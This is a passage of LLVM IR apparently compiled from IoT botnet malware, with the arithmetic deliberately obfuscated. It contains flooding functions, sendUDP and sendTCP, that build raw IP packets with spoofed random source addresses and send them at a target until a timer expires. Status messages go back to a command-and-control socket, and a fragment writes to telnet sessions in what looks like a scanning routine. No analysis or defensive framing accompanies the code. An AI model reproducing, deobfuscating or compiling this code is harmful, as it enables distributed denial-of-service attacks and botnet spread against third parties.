  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 16
  %974 = call i64 @send(i32 %973, i8* getelementptr inbounds ([214 x i8], [214 x i8]* @.str.32, i32 0, i32 0), i64 284, i32 16384)
  %975 = icmp slt i64 %974, 0
  br i1 %975, label %976, label %996

; <label>:976:                                    ; preds = %968
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 16
  %982 = call i32 @sclose(i32 %981)
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 2
  store i8 0, i8* %986, align 8
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 3
  store i8 1, i8* %990, align 1
  %991 = load i32, i32* %2, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 8
  %995 = load i8*, i8** %994, align 8
  call void @llvm.memset.p0i8.i64(i8* %995, i8 0, i64 1024, i32 1, i1 false)
  br label %1025

; <label>:996:                                    ; preds = %968
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 6
  %1001 = load i32, i32* %1000, align 4
  %1002 = sub i32 %1001, 1879338397
  %1003 = add i32 %1002, 45
  %1004 = add i32 %1003, 1879338397
  %1005 = add i32 %1001, 45
  %1006 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1007 = icmp ult i32 %1004, %1006
  br i1 %1007, label %1008, label %1023

; <label>:1008:                                   ; preds = %996
  %1009 = load i32, i32* %2, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 0
  %1013 = load i32, i32* %1012, align 16
  %1014 = call i32 @sclose(i32 %1013)
  %1015 = load i32, i32* %2, align 4
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1016
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1017, i32 0, i32 2
  store i8 0, i8* %1018, align 8
  %1019 = load i32, i32* %2, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1020
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1021, i32 0, i32 3
  store i8 1, i8* %1022, align 1
  br label %1023

; <label>:1023:                                   ; preds = %1008, %996
  br label %1024

; <label>:1024:                                   ; preds = %1023, %950, %926, %776, %712, %581, %517, %415, %243, %71
  br label %1025

; <label>:1025:                                   ; preds = %1024, %976, %935, %882, %857, %829, %761, %738, %658, %644, %566, %543, %461, %330, %193, %149
  %1026 = load i32, i32* %2, align 4
  %1027 = sub i32 %1026, 465526197
  %1028 = add i32 %1027, 1
  %1029 = add i32 %1028, 465526197
  %1030 = add nsw i32 %1026, 1
  store i32 %1029, i32* %2, align 4
  br label %67

; <label>:1031:                                   ; preds = %67
  br label %65
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %314

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %117

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %314

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = sub i32 0, %60
  %62 = sub i32 0, 1
  %63 = add i32 %61, %62
  %64 = sub i32 0, %63
  %65 = add nsw i32 %60, 1
  %66 = sext i32 %64 to i64
  %67 = call noalias i8* @malloc(i64 %66) #2
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %59
  br label %314

; <label>:71:                                     ; preds = %59
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  %74 = sub i32 0, %73
  %75 = sub i32 0, 1
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, 1
  %79 = sext i32 %77 to i64
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 %79, i32 1, i1 false)
  %80 = load i8*, i8** %16, align 8
  %81 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %80, i32 %81)
  %82 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %83 = load i32, i32* %9, align 4
  %84 = add i32 %82, 1307452044
  %85 = add i32 %84, %83
  %86 = sub i32 %85, 1307452044
  %87 = add nsw i32 %82, %83
  store i32 %86, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %88

; <label>:88:                                     ; preds = %111, %110, %71
  %89 = load i32, i32* %15, align 4
  %90 = load i8*, i8** %16, align 8
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %94 = call i64 @sendto(i32 %89, i8* %90, i64 %92, i32 0, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* %18, align 4
  %96 = load i32, i32* %14, align 4
  %97 = icmp eq i32 %95, %96
  br i1 %97, label %98, label %111

; <label>:98:                                     ; preds = %88
  %99 = load i32, i32* %8, align 4
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %98
  %102 = call i32 @rand_cmwc()
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %103, i16* %104, align 2
  br label %105

; <label>:105:                                    ; preds = %101, %98
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = load i32, i32* %17, align 4
  %108 = icmp sgt i32 %106, %107
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %105
  br label %116

; <label>:110:                                    ; preds = %105
  store i32 0, i32* %18, align 4
  br label %88

; <label>:111:                                    ; preds = %88
  %112 = load i32, i32* %18, align 4
  %113 = sub i32 0, 1
  %114 = sub i32 %112, %113
  %115 = add i32 %112, 1
  store i32 %114, i32* %18, align 4
  br label %88

; <label>:116:                                    ; preds = %109
  br label %314

; <label>:117:                                    ; preds = %46
  %118 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %118, i32* %19, align 4
  %119 = load i32, i32* %19, align 4
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %124, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i32, i32* @mainCommSock, align 4
  %123 = call i32 (i32, i8*, ...) @sockprintf(i32 %122, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %314

; <label>:124:                                    ; preds = %117
  store i32 1, i32* %20, align 4
  %125 = load i32, i32* %19, align 4
  %126 = bitcast i32* %20 to i8*
  %127 = call i32 @setsockopt(i32 %125, i32 0, i32 3, i8* %126, i32 4) #2
  %128 = icmp slt i32 %127, 0
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %124
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.34, i32 0, i32 0))
  br label %314

; <label>:132:                                    ; preds = %124
  store i32 50, i32* %21, align 4
  br label %133

; <label>:133:                                    ; preds = %141, %132
  %134 = load i32, i32* %21, align 4
  %135 = sub i32 0, %134
  %136 = sub i32 0, -1
  %137 = add i32 %135, %136
  %138 = sub i32 0, %137
  %139 = add nsw i32 %134, -1
  store i32 %138, i32* %21, align 4
  %140 = icmp ne i32 %134, 0
  br i1 %140, label %141, label %151

; <label>:141:                                    ; preds = %133
  %142 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %143 = call i32 @rand_cmwc()
  %144 = xor i32 %142, -1
  %145 = and i32 %143, %144
  %146 = xor i32 %143, -1
  %147 = and i32 %142, %146
  %148 = or i32 %145, %147
  %149 = xor i32 %142, %143
  call void @srand(i32 %148) #2
  %150 = call i32 @rand() #2
  call void @init_rand(i32 %150)
  br label %133

; <label>:151:                                    ; preds = %133
  %152 = load i32, i32* %10, align 4
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %151
  store i32 0, i32* %22, align 4
  br label %170

; <label>:155:                                    ; preds = %151
  %156 = load i32, i32* %10, align 4
  %157 = sub i32 0, %156
  %158 = add i32 32, %157
  %159 = sub nsw i32 32, %156
  %160 = shl i32 1, %158
  %161 = sub i32 0, 1
  %162 = add i32 %160, %161
  %163 = sub nsw i32 %160, 1
  %164 = xor i32 %162, -1
  %165 = and i32 -1, %164
  %166 = xor i32 -1, -1
  %167 = and i32 %162, %166
  %168 = or i32 %165, %167
  %169 = xor i32 %162, -1
  store i32 %168, i32* %22, align 4
  br label %170

; <label>:170:                                    ; preds = %155, %154
  %171 = load i32, i32* %11, align 4
  %172 = sext i32 %171 to i64
  %173 = sub i64 28, 4430549766641544907
  %174 = add i64 %173, %172
  %175 = add i64 %174, 4430549766641544907
  %176 = add i64 28, %172
  %177 = call i8* @llvm.stacksave()
  store i8* %177, i8** %23, align 8
  %178 = alloca i8, i64 %175, align 16
  %179 = bitcast i8* %178 to %struct.iphdr*
  store %struct.iphdr* %179, %struct.iphdr** %24, align 8
  %180 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %181 = bitcast %struct.iphdr* %180 to i8*
  %182 = getelementptr i8, i8* %181, i64 20
  %183 = bitcast i8* %182 to %struct.udphdr*
  store %struct.udphdr* %183, %struct.udphdr** %25, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = load i32, i32* %22, align 4
  %189 = call i32 @getRandomIP(i32 %188)
  %190 = call i32 @htonl(i32 %189) #13
  %191 = load i32, i32* %11, align 4
  %192 = sext i32 %191 to i64
  %193 = sub i64 0, %192
  %194 = sub i64 8, %193
  %195 = add i64 8, %192
  %196 = trunc i64 %194 to i32
  call void @makeIPPacket(%struct.iphdr* %184, i32 %187, i32 %190, i8 zeroext 17, i32 %196)
  %197 = load i32, i32* %11, align 4
  %198 = sext i32 %197 to i64
  %199 = add i64 8, 6103272924005704726
  %200 = add i64 %199, %198
  %201 = sub i64 %200, 6103272924005704726
  %202 = add i64 8, %198
  %203 = trunc i64 %201 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #13
  %205 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.2* %206 to %struct.anon.3*
  %208 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %207, i32 0, i32 2
  store i16 %204, i16* %208, align 2
  %209 = call i32 @rand_cmwc()
  %210 = trunc i32 %209 to i16
  %211 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.2* %212 to %struct.anon.3*
  %214 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %213, i32 0, i32 0
  store i16 %210, i16* %214, align 2
  %215 = load i32, i32* %8, align 4
  %216 = icmp eq i32 %215, 0
  br i1 %216, label %217, label %219

; <label>:217:                                    ; preds = %170
  %218 = call i32 @rand_cmwc()
  br label %224

; <label>:219:                                    ; preds = %170
  %220 = load i32, i32* %8, align 4
  %221 = trunc i32 %220 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #13
  %223 = zext i16 %222 to i32
  br label %224

; <label>:224:                                    ; preds = %219, %217
  %225 = phi i32 [ %218, %217 ], [ %223, %219 ]
  %226 = trunc i32 %225 to i16
  %227 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.2* %228 to %struct.anon.3*
  %230 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %229, i32 0, i32 1
  store i16 %226, i16* %230, align 2
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.2* %232 to %struct.anon.3*
  %234 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %233, i32 0, i32 3
  store i16 0, i16* %234, align 2
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = bitcast %struct.udphdr* %235 to i8*
  %237 = getelementptr inbounds i8, i8* %236, i64 8
  %238 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %237, i32 %238)
  %239 = bitcast i8* %178 to i16*
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 2
  %242 = load i16, i16* %241, align 2
  %243 = zext i16 %242 to i32
  %244 = call zeroext i16 @csum(i16* %239, i32 %243)
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 7
  store i16 %244, i16* %246, align 2
  %247 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %248 = load i32, i32* %9, align 4
  %249 = add i32 %247, 726026132
  %250 = add i32 %249, %248
  %251 = sub i32 %250, 726026132
  %252 = add nsw i32 %247, %248
  store i32 %251, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %253

; <label>:253:                                    ; preds = %306, %305, %224
  br label %254

; <label>:254:                                    ; preds = %253
  %255 = load i32, i32* %19, align 4
  %256 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %257 = call i64 @sendto(i32 %255, i8* %178, i64 %175, i32 0, %struct.sockaddr* %256, i32 16)
  %258 = call i32 @rand_cmwc()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.2* %261 to %struct.anon.3*
  %263 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %262, i32 0, i32 0
  store i16 %259, i16* %263, align 2
  %264 = load i32, i32* %8, align 4
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %268

; <label>:266:                                    ; preds = %254
  %267 = call i32 @rand_cmwc()
  br label %273

; <label>:268:                                    ; preds = %254
  %269 = load i32, i32* %8, align 4
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #13
  %272 = zext i16 %271 to i32
  br label %273

; <label>:273:                                    ; preds = %268, %266
  %274 = phi i32 [ %267, %266 ], [ %272, %268 ]
  %275 = trunc i32 %274 to i16
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon.2* %277 to %struct.anon.3*
  %279 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %278, i32 0, i32 1
  store i16 %275, i16* %279, align 2
  %280 = call i32 @rand_cmwc()
  %281 = trunc i32 %280 to i16
  %282 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 4
  %284 = load i32, i32* %22, align 4
  %285 = call i32 @getRandomIP(i32 %284)
  %286 = call i32 @htonl(i32 %285) #13
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 8
  store i32 %286, i32* %288, align 4
  %289 = bitcast i8* %178 to i16*
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 2
  %292 = load i16, i16* %291, align 2
  %293 = zext i16 %292 to i32
  %294 = call zeroext i16 @csum(i16* %289, i32 %293)
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 7
  store i16 %294, i16* %296, align 2
  %297 = load i32, i32* %27, align 4
  %298 = load i32, i32* %14, align 4
  %299 = icmp eq i32 %297, %298
  br i1 %299, label %300, label %306

; <label>:300:                                    ; preds = %273
  %301 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %302 = load i32, i32* %26, align 4
  %303 = icmp sgt i32 %301, %302
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %300
  br label %312

; <label>:305:                                    ; preds = %300
  store i32 0, i32* %27, align 4
  br label %253

; <label>:306:                                    ; preds = %273
  %307 = load i32, i32* %27, align 4
  %308 = sub i32 %307, 1298145928
  %309 = add i32 %308, 1
  %310 = add i32 %309, 1298145928
  %311 = add i32 %307, 1
  store i32 %310, i32* %27, align 4
  br label %253

; <label>:312:                                    ; preds = %304
  %313 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %313)
  br label %314

; <label>:314:                                    ; preds = %312, %129, %121, %116, %70, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %492

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %492

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.34, i32 0, i32 0))
  br label %492

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %88

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = add i32 32, -107395824
  %69 = sub i32 %68, %67
  %70 = sub i32 %69, -107395824
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = add i32 %72, 412458759
  %74 = sub i32 %73, 1
  %75 = sub i32 %74, 412458759
  %76 = sub nsw i32 %72, 1
  %77 = xor i32 %75, -1
  %78 = and i32 959337553, %77
  %79 = xor i32 959337553, -1
  %80 = and i32 %75, %79
  %81 = xor i32 -1, -1
  %82 = and i32 %81, 959337553
  %83 = and i32 -1, %79
  %84 = or i32 %78, %80
  %85 = or i32 %82, %83
  %86 = xor i32 %84, %85
  %87 = xor i32 %75, -1
  store i32 %86, i32* %19, align 4
  br label %88

; <label>:88:                                     ; preds = %66, %65
  %89 = load i32, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 0, %90
  %92 = sub i64 40, %91
  %93 = add i64 40, %90
  %94 = call i8* @llvm.stacksave()
  store i8* %94, i8** %20, align 8
  %95 = alloca i8, i64 %92, align 16
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %21, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %98 = bitcast %struct.iphdr* %97 to i8*
  %99 = getelementptr i8, i8* %98, i64 20
  %100 = bitcast i8* %99 to %struct.tcphdr*
  store %struct.tcphdr* %100, %struct.tcphdr** %22, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load i32, i32* %19, align 4
  %106 = call i32 @getRandomIP(i32 %105)
  %107 = call i32 @htonl(i32 %106) #13
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = add i64 20, 7016426452646373622
  %111 = add i64 %110, %109
  %112 = sub i64 %111, 7016426452646373622
  %113 = add i64 20, %109
  %114 = trunc i64 %112 to i32
  call void @makeIPPacket(%struct.iphdr* %101, i32 %104, i32 %107, i8 zeroext 6, i32 %114)
  %115 = call i32 @rand_cmwc()
  %116 = trunc i32 %115 to i16
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.0* %118 to %struct.anon.1*
  %120 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %119, i32 0, i32 0
  store i16 %116, i16* %120, align 4
  %121 = call i32 @rand_cmwc()
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 2
  store i32 %121, i32* %125, align 4
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 3
  store i32 0, i32* %129, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon.0* %131 to %struct.anon.1*
  %133 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = xor i16 -241, -1
  %136 = xor i16 %134, %135
  %137 = and i16 %136, %134
  %138 = and i16 %134, -241
  %139 = and i16 %137, 80
  %140 = xor i16 %137, 80
  %141 = or i16 %139, %140
  %142 = or i16 %137, 80
